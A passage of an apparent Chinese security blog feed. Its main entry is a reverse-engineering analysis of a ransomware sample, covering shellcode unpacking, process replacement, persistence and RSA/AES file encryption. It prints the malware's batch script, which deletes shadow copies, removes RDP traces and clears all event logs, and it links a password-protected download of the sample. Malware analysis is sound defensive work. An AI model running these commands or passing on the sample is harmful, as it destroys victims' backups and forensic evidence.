class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">整数</div><div class="line">I     <span class="keyword">int</span> </div><div class="line">[I    <span class="keyword">int</span>[]</div><div class="line">[[I   <span class="keyword">int</span>[][]</div><div class="line">[[[I  <span class="keyword">int</span>[][]</div><div class="line"></div><div class="line">字符串</div><div class="line">[L    String</div></pre></td></tr></table></figure></p><p>例1:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class">LpackageName/name/ObjectName;</span>-&gt;MethodName(III)Z</div><div class="line"></div><div class="line">MethodName为具体的方法名</div><div class="line">(III)Z是方法的签名部分</div><div class="line">括号内的III为方法的参数:在此为（int，int，int）</div><div class="line">Z表示方法的返回类型:boolean类型</div></pre></td></tr></table></figure></p><p>例2:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">method(I[[II<span class="class">Ljava/lang/String;</span>[<span class="class">Ljava/lang/Object;</span>)Ljava/lang/string</div><div class="line">==</div><div class="line">String method(int,int[][],int,String,Object)</div></pre></td></tr></table></figure></p><p>字段:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class">Lpackage/name/ObjectName;</span>-&gt;FileName:<span class="class">Ljava/lang/String;</span></div><div class="line"></div><div class="line">类型(<span class="class">Lpackage/name/ObjectName;</span>),字段名(FileName),字段类型(<span class="class">Ljava/lang/String;</span>)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常用的Smali语法&lt;br&gt;
    
    </summary>
    
      <category term="android" scheme="http://yoursite.com/categories/android/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次复现勒索病毒分析</title>
    <link href="http://yoursite.com/2018/05/30/re_23_viruses2/"/>
    <id>http://yoursite.com/2018/05/30/re_23_viruses2/</id>
    <published>2018-05-30T12:49:18.000Z</published>
    <updated>2018-06-03T11:19:15.088Z</updated>
    
    <content type="html"><![CDATA[<p>网上有个病毒分析，自己想好好的复现，断断续续分析了好几天才搞明白<br><a id="more"></a></p><h1 id="样本概述"><a href="#样本概述" class="headerlink" title="样本概述"></a>样本概述</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>exe: 样本主体</div><div class="line">shellcode.txt: 主体解密后的 shellcode</div><div class="line">dump.exe: shellcode 执行后的新 PE 文件</div><div class="line">a.bat: dump.exe 释放出的批处理文件，用于善后工作</div><div class="line">a.txt..doc: 加密后的文件样本</div><div class="line">Read___ME.html: 勒索信息</div></pre></td></tr></table></figure><p>样本名: 1.exe<br>MD5: 612974dcb49adef982d9ad8d9cbdde36<br>SHA1: b817e361bd0cc1819d7f6a1189f0f5d56ed48721<br><a href="https://pan.baidu.com/s/1_tbxvRXK_5zVKWklw0-L2A" target="_blank" rel="external">下载</a>(解压密码 x-encounter)<br>分析环境及工具:<br>win7 ida od</p><h1 id="行为预览"><a href="#行为预览" class="headerlink" title="行为预览"></a>行为预览</h1><h2 id="1-exe-样本主体行为"><a href="#1-exe-样本主体行为" class="headerlink" title="1.exe (样本主体行为):"></a>1.exe (样本主体行为):</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、简单的反调试技术，调用无效循环及无效的 API 迷惑分析人员</div><div class="line"><span class="number">2</span>、从数据段解密出 shellcode，并显式调用 VirtualProtect 使 shellcode 可读可写可执行，接着运行 shellcode</div></pre></td></tr></table></figure><h2 id="shellcode-txt-shellcode-行为"><a href="#shellcode-txt-shellcode-行为" class="headerlink" title="shellcode.txt(shellcode 行为):"></a>shellcode.txt(shellcode 行为):</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、获取 Kernel32.dll 的基址、获取函数地址、解密新 PE 文件</div><div class="line"><span class="number">2</span>、使用进程替换技术，将老 PE 文件的内存空间替换为解密后的新 PE 文件，修复新 PE 文件的 IAT，接着跳向新 PE 文件的 OEP</div></pre></td></tr></table></figure><h2 id="dump-exe-新-PE-文件的行为"><a href="#dump-exe-新-PE-文件的行为" class="headerlink" title="dump.exe:(新 PE 文件的行为):"></a>dump.exe:(新 PE 文件的行为):</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、解密数据，获取系统信息，释放到系统路径，打开注册表添加启动项</div><div class="line"><span class="number">2</span>、创建文件，保存用户 RSA 公钥以及 用户 ID，并生成勒索信息</div><div class="line"><span class="number">3</span>、遍历所有进程，如果发现指定进程 kill 掉</div><div class="line"><span class="number">4</span>、创建加密线程，遍历文件并加密文件并将文件的后缀名改为 ..doc，创建勒索信息文件</div><div class="line"><span class="number">5</span>、释放 bat 文件到临时目录，创建进程并执行</div><div class="line"><span class="number">6</span>、自删除</div></pre></td></tr></table></figure><h2 id="a-bat-批处理文件的行为"><a href="#a-bat-批处理文件的行为" class="headerlink" title="a.bat:(批处理文件的行为):"></a>a.bat:(批处理文件的行为):</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、删除卷影副本</div><div class="line"><span class="number">2</span>、删除指定的注册表项，添加指定的注册表项</div><div class="line"><span class="number">3</span>、删除日志信息</div></pre></td></tr></table></figure><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="1-exe-样本主体分析"><a href="#1-exe-样本主体分析" class="headerlink" title="1.exe(样本主体分析)"></a>1.exe(样本主体分析)</h2><p>PEID查壳<br><img src="https://i.imgur.com/5RAX3o9.png" alt=""><br>ida加载找到主函数<br>首先呼叫SetProcessShutdownParameters,WinHttpOpen,WinHttpConnect,WinHttpQueryOption连接网络的函数<br>但是传入的参数都是0，可能是大量无关 API，可能是混淆代码，并没有什么用。接着<br><img src="https://i.imgur.com/xe4xSGs.png" alt=""><br>这里并且在 0040127D 处会进入一个循环，判断 var_8 的值等不等于 8B9A6F96h，里面就是呼叫一个GetWindowsDirectoryW。但是感觉没有什么用，而且循环n次。是无关的循环。</p><p>紧接着调用 GlobalMemoryStatus，获取内存信息，在 004013EF 处调用 LocalAlloc 分配了 8700h 的空间<br><img src="https://i.imgur.com/d78YHw2.png" alt=""><br>接着偏移数据（加密的 shellcode ）复制到刚刚分配的空间，之后进入右边的条件分支，对 shellcode 进行解密<br><img src="https://i.imgur.com/c3UHE4H.png" alt=""><br>解密函数如下<br><img src="https://i.imgur.com/NOR7YYa.png" alt=""><br>对加密的 shellcode 分组，通过一个循环，每 8 字节一组，对这 8 字节调用 sub_4015C0 进行解密，该函数的第三个参数为解密 key。</p><p>接着用od跟,shellcode还没有解密<br><img src="https://i.imgur.com/WWeRz55.png" alt=""><br>解密后，<br><img src="https://i.imgur.com/HUp5boX.png" alt=""><br>在解密完成后,dump下来shellcode保存为shellcode(等下会分析这个shellcode),再接着看看。<br><img src="https://i.imgur.com/P0aTCYr.png" alt=""><br>显示获取VirtualProtect的函数地址，使解密后的shellcode可读可写可执行。程序接着调用shellcode。<br><img src="https://i.imgur.com/s7ZCe6m.png" alt=""></p><h2 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h2><p>将shellcode的代码dump出来。IDA 载入 shellcode.txt，发现 shellcode 只有两个 Call。<br><img src="https://i.imgur.com/aEIhEWL.png" alt=""><br>进入第一个 call<br><img src="https://i.imgur.com/0NAxNJl.png" alt=""><br>该函数通过 fs 寄存器获取 Kernel32.dll 的基址<br><img src="https://i.imgur.com/67LWRoB.png" alt=""><br>接着通过解析 PE 文件，获取 PE 头，接着获取数据目录第 0 项也就是导出表的地址，接着在导出表中获取 GetProcAddress 和 LoadLibrary 的地址，然后返回<br><img src="https://i.imgur.com/a8iPXU4.png" alt=""><br>(用OD)进入 shellcode<br><img src="https://i.imgur.com/PPeaoVY.png" alt=""><br>shellcode的第二个 call，如图，观察此处的 eax 所指向的地址的值<br><img src="https://i.imgur.com/7TqsFXZ.png" alt=""><br>很明显这是一个经过加密处理的 PE 文件，那么在 MZ 字符之前的值是什么呢？<br>经过后续的分析，我们可以了解到，这一段内存实际上是以 “新 PE 的参数+加密的新 PE” 这样的结构存储的，结构的详细分析如下图<br><img src="https://i.imgur.com/bXL3cdL.png" alt=""><br>然后通过之前获取的 GetProcAddress 和 LoadLibrary 的地址，来动态获取其他函数的的地址<br><img src="https://i.imgur.com/cpY4nB5.png" alt=""><br>函数地址获取完后，调用 GetVersionExA，<br><img src="https://i.imgur.com/plQ78uK.png" alt=""><br>判断 dwMajorVersion 等不等于 6<br><img src="https://i.imgur.com/SnHME3q.png" alt=""><br>接着分配内存，并调用解密函数<br><img src="https://i.imgur.com/k9MbFGs.png" alt=""><br>该函数的两个参数是通过 “新 PE 的参数” 这个结构获得的,解密函数大概是通过分组的形式，逐步对 PE 进行解密的，解密的关键一个是索引值，一个是 key 都在 `”新 PE 的参数” 这个结构中，解密后的 PE 文件如下图<br><img src="https://i.imgur.com/Jw4Sxxi.png" alt=""><br>紧接着调用 VirtualProtect，目标地址是 400000，也就是老 PE 文件的加载基址，将其属性改为可读可写可执行，为后面的替换做准备。然后将 400000 处的值清零，开始复杂的 PE 操作。<br><img src="https://i.imgur.com/bRJRZV2.png" alt=""><br>首先通过 DOS 头的 e_lfanew 获取 PE 头的偏移，找到 PE 头之后将 PE 头偏移四个字节的数据（也就是 Machine）存到局部变量中，然后通过 PE 头偏移 14h 处也就是 SizeOfOptionalHeader 获得 OptionalHeader 的长度，之所以计算各个段的长度是为了获取最后一个节区的偏移，通过偏移把解密后的新 PE 的 DOS 头，PE 头和节表头复制到 400000 的内存空间中，之后从 “新 PE 的参数” 中获取新 PE 的 EP，修正 EP，最后解析节表头获取节表的 pointerToRawData，准备进行节表数据的复制。<br><img src="https://i.imgur.com/2C2BroX.png" alt=""><br>右边分支为复制节区数据，由于新PE文件只有一个节区所以循环只有一次，这里不做过多的解释，重点在 IAT 的修复上，当右边分支执行完后，会执行左边的分支，首先会释放掉解密后的新 PE 文件，通过 PE 头的偏移获取 DataDirectory 数据目录表，在表中接着获取 DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_IMPORT] 的 RVA 也就是导入表的 RVA 和 Size，进行修复，而且还对 DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE] 资源目录项的 RVA 和 SIZE 也进行了修复，由于 DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_IMPORT] 的 RVA 指向 IMAGE_IMPORT_DESCRIPTOR 结构体，接着比较该结构体的 Name字段是不是等于零，如果不为零，如下图<br><img src="https://i.imgur.com/0x6pADD.png" alt=""><br>调用 LoadLibrary 载入导入的 DLL，之后判断 IMAGE_IMPORT_DESCRIPTOR 结构体中第一个字段，也就是 OriginalFirstThunk 是否为零，如果不为零，接着获取 IMAGE_IMPORT_DESCRIPTOR 结构的第 5 个字段，也就是 FirstThunk，通过 FirstThunk找到 IMAGE_THUNK_DATA32 结构体的 AddressofData 字段，通过 AddressofData 找到获得 _IMAGE_IMPORT_BY_NAME 结构体中的 Name字段，也就是该 DLL 导出函数的名称，之后调用 GetProcAddress 对其进行修复。修复 IAT 的操作一共有两层循环，外层循环遍历所有的导入的 DLL，内层循环对 DLL 导出的函数进行修复，<br>IDA中如下<br><img src="https://i.imgur.com/kDIOCiT.png" alt=""><br>在 OD 中如下<br><img src="https://i.imgur.com/9vaBerV.png" alt=""><br>修复完 IAT 之后，调用 atexit 注册终止函数，最终跳转到新 PE 的 OEP<br><img src="https://i.imgur.com/ywxFiSA.png" alt=""><br>折腾了半天终于见到了病毒的真身</p><h2 id="dump-exe-新-PE-文件的分析"><a href="#dump-exe-新-PE-文件的分析" class="headerlink" title="dump.exe:(新 PE 文件的分析)"></a>dump.exe:(新 PE 文件的分析)</h2><p>我们通过 LoadPE 将此时病毒的内存，转存下来命名为 dump.exe，载入到 IDA 中，由于 dump.exe 可能用了一些对抗反汇编的技术，导致 IDA 无法判别哪些是数据哪些是代码，我们可以手动将其转换，但即使转换成功后也无法正常反编译，加大了我们的分析难度，<br>进入新的oep后<br><img src="https://i.imgur.com/vNRfFGZ.png" alt=""><br>只能通过 OD(1.exe) 一点一点的单步进行分析。<br>我们进入函数入口处，步入第一个 call[]，先分配了 5 个堆空间，接着获取病毒文件的完整地址和系统的临时目录<br><img src="https://i.imgur.com/WKQrVFt.png" alt=""><br>之后进行对相关字符串进行解密的操作<br><img src="https://i.imgur.com/e9KqUWE.png" alt=""><br>大概算法是解密了一个 256 位的 key (怀疑是黑客的 RSA 公钥)，用对 key 进行操作然后与加密的字符串进行异或，两次解密后的字符串如下<br><img src="https://i.imgur.com/DucG8UT.png" alt=""><br>接着调用 00409FE7 处的 call sub_409CB8 解密函数，将解密后的数据(一些 windows 上常用的软件名称)以.为分割符分为 43 个字符串的首地址存放在分配的内存地址中。<br>ida<br><img src="https://i.imgur.com/VpzWkD3.png" alt=""><br>解密函数call sub_409CB8<br><img src="https://i.imgur.com/AI36qHE.png" alt=""><br>以同样的方式解密 401430 处的数据(系统环境之类的参数)，之后通过系统环境变量获取 appdata 的目录，进行字符串拼接，<br><img src="https://i.imgur.com/MZRxkEu.png" alt=""><br>之后调用 CopyFile 将该病毒复制到 appdata 目录，这两次解密的目的是对某些特殊字符的文件夹进行绕过<br><img src="https://i.imgur.com/HV6IU2b.png" alt=""><br>在 C:\Documents and Settings\Administrator\Application Data 下可以找到该病毒的副本，接着在 0040A088 调用与注册表有关的函数，为了常驻系统。<br><img src="https://i.imgur.com/94vz0Kn.png" alt=""><br>继续获取系统目录 C:\Documents and Settings\All Users，并通过一个加密函数生成一个固定的 Hash 值，接着进行字符串拼接，最终调用 0040A11A 处的函数创建文件<br><img src="https://i.imgur.com/oDn2fat.png" alt=""><br>进入 0040A11A 处的函数，创建文件，写入文件，文件内容是通过复杂的加密算法生成的用户 ID，<br><img src="https://i.imgur.com/lGa7GeX.png" alt=""><br>这里我们只要了解一下病毒的行为，具体加密流程在加密部分会详细介绍，创建的文件如下图<br><img src="https://i.imgur.com/wg5jBJ0.png" alt=""><br>之后对勒索文档的内容进行解密，勒索文件的组合分为三部分<br>第一步先将解密后的数据前64E部分复制到分配好的缓冲区中<br>第二步将之前提到过的用户 ID的部分数据复制到第一部分的后面<br>第三步将剩下的勒索信息复制到第二部分后面，如图<br><img src="https://i.imgur.com/jBkh1E5.png" alt=""><br>在 0040A1FA 处调用 call sub_402354，该函数功能如下，<br><img src="https://i.imgur.com/TM92o0C.png" alt=""><br>该函数用来关闭一些进程，如 word，excel，防止后面加密函数运行时，由于文件占用导致加密失败。<br>在最后连续调用了 3 个 call<br>第一个 call 寻找盘符，加密文件，这里不做过多分析，放到加密部分细讲<br>第二个 call 创建 bat，创建进程并运行，用于善后工作，从内存中 dump 出批处理文件，内容如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">@echo off..vssadmin.exe Delete Shadows /All /Quiet</div><div class="line">reg <span class="keyword">delete</span> <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"</span> /va /f</div><div class="line">reg <span class="keyword">delete</span> <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span> /f</div><div class="line">reg add <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Terminal ServerClient\Servers"</span></div><div class="line">cd %userprofile%\documents\                                   </div><div class="line">attrib Default.rdp -s -h                 </div><div class="line">del Default.rdp                               </div><div class="line">for /F "tokens=*" %1 in ('wevtutil.exe el')DO wevtutil.exe cl "%1"</div></pre></td></tr></table></figure></p><p>vssadmin.exe 删除卷影副本，wevtutil.execl 命令删除日志信息<br>第三个 call 用于自删除</p><h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><p>目前主流的勒索软件使用的加密算法为 RSA 和 AES。AES 属于对称密码体制，RSA 属于非对称密码体制，一般来讲 RSA 有两对，黑客有一对，用户生成一对，黑客的 RSA 私钥自己保留，将 RSA 公钥以硬编码(或加密)的方式存储在病毒中，用来加密用户的 RSA 私钥，用户的 RSA 公钥则用来加密 AES 密钥，AES 密钥用来加密文件。视病毒的情况而定，有些病毒每一个加密文件对应一个 AES 密钥，有些病毒所有加密文件只对应一个 AES 密钥。<br>之前已经提到过，该病毒主要有两次加密，第一次是写入 Hash 文件和勒索文档的用户 ID，第二次就是对文件进行加密</p><h3 id="用户ID生成分析"><a href="#用户ID生成分析" class="headerlink" title="用户ID生成分析"></a>用户ID生成分析</h3><p>在之前的分析中我刻意回避了一个函数 00409F43 处的 call sub_408F24，该函数的功能如下<br><img src="https://i.imgur.com/B67iyn2.png" alt=""><br>a1 也就是第一个参数是 256 位的字符串(应该是未被加密)，个人推测应该是黑客的 RSA 公钥，如下图<br><img src="https://i.imgur.com/wH6LXfM.png" alt=""><br>该函数内出现了 SHA256_K，ROL4 和 ROR4 的字样，推测该函数的目的是对黑客的 RSA 公钥进行 SHA256 加密，加密后的内容<br>是不是很熟悉……在对加密的字符串进行解密的时候作为解密的 key入栈，在创建 Hash 文件的时候作为文件名。转到生成用户 ID的函数空间，进入 sub_40A534，首先分配了 1024 大小的内存空间，在 sub_40A3DD 函数中的 sub_404336 函数生成了用户 RSA 的密钥，之后将该密钥写入 Hash 文件中。<br><img src="https://i.imgur.com/AFSxEly.png" alt=""><br><img src="https://i.imgur.com/TMMUaE3.png" alt=""><br>接来下调用两次 sub_4024E8 生成 128 位的明文(该明文应该是与用户 RSA 私钥有关系的，不然用黑客 RSA 公钥加密就没有意义了，不过我没有分析出来这个拼接的 128 位明文是什么)，在 sub_40A3F4 处用黑客的 RSA 公钥对明文进行加密，返回给 V26 变量,最后调用 sub_40267E 将 V26 中的十六进制数据转换为 ASCII 数据，如图<br><img src="https://i.imgur.com/koA5ajT.png" alt=""><br>回到原来的函数中，接着调用 SetFilePoint 定位到 Hash 文件的末尾，使用 WriteFile 将上图的值写入 Hash 文件末尾(之后合成勒索文档时，中间插的那一段数据也是上图所示的数据)<br>至此用户 ID分析完毕</p><h3 id="文件加密部分"><a href="#文件加密部分" class="headerlink" title="文件加密部分"></a>文件加密部分</h3><p>来到 0040A20A 处的 call sub_409B9C 进入文件加密函数，注意调用该函数时的参数，第一个参数为之前生成的用户 RSA 的公钥</p><p>首先会调用 GetLogicalDrivers 函数判断宿主主机有几个盘，将返回值转换为二进制 10000000000000000000000100 从右向左数，一共有两个盘，C 盘和Z 盘，调用 GetDriveTypeA 获取相应磁盘的类型，接着进行判断如果属于硬盘驱动器、远程(网络驱动器)和移动驱动器中的一种，则对每一个符合要求的磁盘调用 CreateThread 创建一个加密线程，回调函数为 sub_40994F，回调参数为指向相应的盘符的指针，在回调函数处下断点，顺便在c盘根目录下创建 a.txt，内容为 123，以便分析加密方式</p><p>接着对各种字符串的操作，调用 FindFirstFileW，先寻找 C 盘根目录的文件，找到之后会进行一系列的判断<br>比较后缀名是不是 ..doc 判断是否被加密<br>比较文件名是不是 Read__ME.html(生成的勒索文档)，比较文件名是不是 Hash 文件<br>比较文件名是不是比较是不是复制到 C:\Documents and Settings\Administrator\Application Data 目录的病毒副本<br>如果全部判断失败则进入 00409B01 处的 call sub_409081 文件加密函数，这里要留心该文件加密函数的三个参数<br>第一个参数为要加密的文件名称，也就是 a.txt<br>第二个参数是用户 RSA 的公钥<br>第三个参数是用户 ID的第二部分</p><p>函数会调用 UuidCreate 创建一个全世界独一无二的 uuid 值，uuid 的值如下</p><p>后调用 CreateFile 打开要加密的文件，获取文件大小，计算 uuid 的长度，调用 sub_407009 分配了两块内存空间，之后将要加密的文件大小与文件名称进行运算</p><p>之后将运算后的结果与 uuid 进行加密运算(应该是 SHA256 加密)，而且加密了 2000h 次</p><p>经过运算之后的值为下图，从 D1BB98 到 D1BBB8，我们可以设这个值为 A</p><p>紧接着调用 004092EF 处的 call sub_402780 对 D1BB70 的值进行扩充，该函数有一个参数为 A，通过 A 的值生成 AES 加密的密钥，后面的分析也验证了这一点，扩充的数据中包含一个 256 位的 AES 密钥，从 D1BC10 到 D1BD20，设这个值为 B。</p><p>接着调用 ReadFile 将文件内容读取到缓冲区中，并在 00409489 处 call sub_408F7F 对文件内容进行加密，其中该函数的参数包含 B</p><p>这里可以推测一下 00409489 处的函数应该为 AES 加密，而该函数的第四个参数也就是 B (位于扩展数据中)作为 AES 的 key 进行加密。加密后的文件数据如下(该勒索病毒对每一个文件创建一个 AES 的密钥)</p><p>接着将加密后的文件数据复制到 D1BBB8 处，然后调用三次 WriteFile，分别将数据复制到文件中，使用用户 RSA 公钥将 uuid 进行加密，并写入文件，最后将用户 ID的第二部分写入文件中，加密后的 a.txt </p><h3 id="分析完毕"><a href="#分析完毕" class="headerlink" title="分析完毕"></a>分析完毕</h3><p>通过上面的分析，我们可以了解到该病毒对每个文件的 uuid 进行运算，通过运算结果生成 AES 密钥，并使用用户 RSA 公钥对 uuid 进行加密放在了文件中，从用户的角度考虑要解密文件数据首先要获得 uuid 的值，由于 uuid 被用户 RSA 公钥进行加密了，所以我们要获得用户 RSA 的私钥，而用户 RSA 的私钥又被黑客 RSA 的公钥进行加密后写入用户 ID 中，所以我们要获得黑客 RSA 私钥，但是黑客的 RSA 私钥只有黑客一个人拥有，所以用户只能向黑客支付赎金并提供被加密的文件和在机器上生成的 Hash 文件才能解密</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>1、加密技术掌握的不熟练，外加上该病毒是自己实现 RSA 和 AES 的加密的，没有调用微软提供的 CSP 容器，所以对分析造成很大的困难。<br>2、分析病毒要有耐心，切记分析加密部分的时候要一口气分析完，由于表哥只给了一个样本所以我们并不知道该病毒是如何传播的。<br>3、写文不易，且看且珍惜。<br>参考:<br><a href="https://mp.weixin.qq.com/s/TznmkeU1zZU_wJSw0Jx6GQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/TznmkeU1zZU_wJSw0Jx6GQ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网上有个病毒分析，自己想好好的复现，断断续续分析了好几天才搞明白&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Api第三篇</title>
    <link href="http://yoursite.com/2018/05/28/re_22_win_api3/"/>
    <id>http://yoursite.com/2018/05/28/re_22_win_api3/</id>
    <published>2018-05-28T12:49:18.000Z</published>
    <updated>2018-05-30T08:55:36.542Z</updated>
    
    <content type="html"><![CDATA[<p>Windows API和Socket编程<br><a id="more"></a></p><h1 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h1><p>使用win32 api写出的程序有以下优势。<br>1、生成的可执行体积小<br>2、执行效率高<br>3、更适合用于编写直接对系统进行底层操作的程序，其所生成的代码质量也更加高效简洁。</p><h2 id="Socket-API"><a href="#Socket-API" class="headerlink" title="Socket API"></a>Socket API</h2><p>所有在win32平台上的Winsock编程都要经历的步骤:<br>定义变量-&gt;获取Winsocket版本-&gt;加载winsocket库-&gt;初始化-&gt;创建套接字-&gt;设置套接字选项-&gt;关闭套接字-&gt;卸载winsocket库-&gt;释放所有资源</p><h2 id="C-S模式"><a href="#C-S模式" class="headerlink" title="C/S模式"></a>C/S模式</h2><p>传统的网络通信模式是C/S模式，即客户端与服务器端。服务端先启动监听，客户端连接。</p><h1 id="服务端Socket的操作"><a href="#服务端Socket的操作" class="headerlink" title="服务端Socket的操作"></a>服务端Socket的操作</h1><p>接下来将详细阐述Windows Sockets编程中服务端的Socket编程。服务端编程主要涉及初始化阶段调用WSAStartup函数、建立Socket、绑定和监听端口，设置接受函数，异步处理函数WSAAsyncSelect、Socket连接断开。</p><h2 id="初始化-WSAStartup"><a href="#初始化-WSAStartup" class="headerlink" title="初始化 WSAStartup()"></a>初始化 WSAStartup()</h2><p>在使用Scoket之前必须调用WSAStartup函数。此函数是应用程序中用来初始化Windows Socket dll。只有此函数调用成功后，应用程序才可以调用dll中的其他函数，否则后面的函数都调用失败。<br><code>int WSAStartup(WORD wVersionRequested,LPWSADATA lpWSAData)</code><br>1、第一个参数wVersionRequested:是Windows Socket的版本号<br>2、第二个参数lpWSAData: 是指向WSADATA的指针，用来存储系统传回的关于Winsocket的结构。<br>3、返回值:执行成功返回0<br>调用方式:<br><code>WSAStartup(MAKEWORD(2,2),(LPWSADATA)&amp;WSAData)</code></p><h2 id="建立Socket"><a href="#建立Socket" class="headerlink" title="建立Socket"></a>建立Socket</h2><p>初始化Winsocket的动态链接库后，需要在服务器端建立一个用来监听Socket句柄。<br><code>SOCKET socket(int af,int type,int protocol)</code><br>1、第一个参数af:指应用程序使用的通讯协议的协议族，对于TCP/IP—&gt;FF_INET<br>2、第二个参数type: 指定要创建的套接字类型。<br>3、第二个参数protocol: 指定要使用的通讯协议。<br>3、返回值:执行成功返回Socket对象，否则返回ICVALID_SOCKET.</p><h2 id="绑定端口"><a href="#绑定端口" class="headerlink" title="绑定端口"></a>绑定端口</h2><p>创建了一个Socket以后，一个服务器程序必须调用bind函数来为其绑定一个IP地址和特定的端口号。这样客户端才指定连接谁<br><code>int bind(SOCKET s,const struct sockaddr FAR *name,int namelen)</code><br>1、第一个参数s:指定待绑定的Socket描述符<br>2、第二个参数name: 指定一个Sockaddr。<br>3、第二个参数namelen: 指定name结构体的大小。<br>这里介绍一下第二个参数name：<br><code>struct sockaddr(u_short sa_family;  char sa_data[14]);</code><br>对于TCP/IP协议族的套接字进行绑定时，通常使用另一个结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">struct <span class="title">sockaddr_in</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">short</span> sin_famil;</span></span></div><div class="line"><span class="function"><span class="params">u_short sin_port;</span></span></div><div class="line"><span class="function"><span class="params">struct in_addr sin_addr;</span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">char</span> sin_zero[<span class="number">8</span>];</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div><div class="line">第一个参数sin_famil:指定TCP/IP协议族类型AF_INET。</div><div class="line">第二个参数sin_port: 指明端口号。</div><div class="line">第二个参数sin_addr: 表示IP地址</div></pre></td></tr></table></figure></p><p>调用的例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">name</span>;</span></div><div class="line">name.sin_family=AF_INET;</div><div class="line">name.sin_port=htons(<span class="number">80</span>);</div><div class="line">name.sin_addr.s_addr=htonl(INADDR_ANY);<span class="comment">//没有ip可以填这个</span></div><div class="line"><span class="keyword">int</span> namelen=<span class="keyword">sizeof</span>(name);</div><div class="line">bind(sSocket,(struct sockaddr *)&amp;name,namelen)</div></pre></td></tr></table></figure></p><p>可以通过getsockname()函数来获知其被设定的值。</p><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><p>服务器必须建立一个监听的队列来接受客户端发起的请求。<br><code>int listen(SOCKET s,int backlog)</code><br>第二个参数backlog:为一次连接的最大数目。<br>accept函数<br><code>SOCKET accept(SOCKET s,struct sockaddr FAR *addr,int FAR *addrlen)</code><br>WSAAsyncSelect函数<br><code>int WSAAsyncSelect()b</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">SetProcessShutdownParameters</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">  DWORD dwLevel,</span></span></div><div class="line"><span class="function"><span class="params">  DWORD dwFlags</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div><div class="line">参数:</div><div class="line">dwLevel:进程关闭优先级（相对于系统中的其他进程的）.系统从高级别到低级别关闭进程.最高和最低的关闭优先级保留给系统组件用，用户的参数必须是以下：</div><div class="line">Value          Meaning</div><div class="line">000–0FF System reserved last shutdown range(系统保留最后关机范围).</div><div class="line"><span class="number">100</span>–<span class="number">1F</span>F Application reserved last shutdown range.</div><div class="line"><span class="number">200</span>–<span class="number">2F</span>F Application reserved <span class="string">"in between"</span> shutdown range.</div><div class="line"><span class="number">300</span>–<span class="number">3F</span>F Application reserved first shutdown range.</div><div class="line"><span 